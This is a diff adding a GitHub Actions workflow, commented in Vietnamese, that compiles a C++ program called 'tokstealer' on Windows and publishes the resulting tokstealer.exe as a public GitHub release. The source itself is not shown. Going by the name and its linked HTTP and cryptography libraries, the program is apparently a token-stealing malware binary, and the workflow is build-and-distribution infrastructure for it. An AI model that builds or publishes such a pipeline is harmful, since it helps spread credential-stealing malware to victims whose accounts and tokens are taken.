@@ -1,0 +1,60 @@
+name: Build TokStealer
+
+on:
+  workflow_dispatch:   # Chạy thủ công từ tab Actions
+
+jobs:
+  build:
+    runs-on: windows-latest
+    permissions:
+      contents: write
+      pull-requests: write
+      repository-projects: write
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+
+    - name: Configure MSVC and Build
+      shell: cmd
+      run: |
+        set "VSWHERE=%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"
+        for /f "usebackq tokens=*" %%i in (`"%VSWHERE%" -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath`) do set "VSPATH=%%i"
+        call "%VSPATH%\VC\Auxiliary\Build\vcvars64.bat"
+        cl /std:c++17 /EHsc /O2 /DNDEBUG /MD tokstealer.cpp /link winhttp.lib bcrypt.lib crypt32.lib /MACHINE:X64 /OUT:tokstealer.exe
+
+    - name: List directory for debugging
+      shell: cmd
+      run: dir
+
+    # Xóa tag và release cũ (nếu có)
+    - name: Delete-tag-and-release
+      uses: dev-drprasad/delete-tag-and-release@v1.1
+      with:
+        tag_name: TokStealer
+        delete_release: true
+        github_token: ${{ secrets.GITHUB_TOKEN }}
+
+    # Tạo release mới
+    - name: Create Release
+      id: create_release
+      uses: actions/create-release@latest
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      with:
+        tag_name: TokStealer
+        release_name: TokStealer
+        body: "Release created by GitHub Actions (manual build)"
+        draft: false
+        prerelease: false
+
+    # Upload tokstealer.exe lên release
+    - name: Upload Release Asset
+      uses: actions/upload-release-asset@v1
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      with:
+        upload_url: ${{ steps.create_release.outputs.upload_url }}
+        asset_path: tokstealer.exe
+        asset_name: tokstealer.exe
+        asset_content_type: application/octet-stream
